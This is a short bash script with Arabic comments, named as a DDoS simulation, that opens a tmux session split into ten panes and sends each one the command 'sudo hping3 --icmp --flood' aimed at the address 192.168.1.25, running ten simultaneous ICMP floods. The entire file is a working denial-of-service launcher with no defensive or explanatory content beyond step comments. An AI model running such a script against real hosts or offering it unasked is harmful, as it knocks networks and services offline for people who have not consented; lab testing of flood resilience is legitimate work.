#!/bin/bash

SESSION_NAME="ddos_simulation"

# 1. إنشاء جلسة tmux جديدة في الخلفية
tmux new-session -d -s $SESSION_NAME

# 2. إنشاء 9 تقسيمات إضافية ليصبح المجموع 10 أجزاء داخل نفس الشاشة
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
done

# 3. إرسال أمر الهجوم إلى كل جزء (Pane) تلقائياً وتنفيذه
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "sudo hping3 --icmp --flood 192.168.1.25" C-m
done

# 4. الدخول إلى الجلسة مباشرة لرؤية واجهة العمل كاملة
tmux attach-session -t $SESSION_NAME
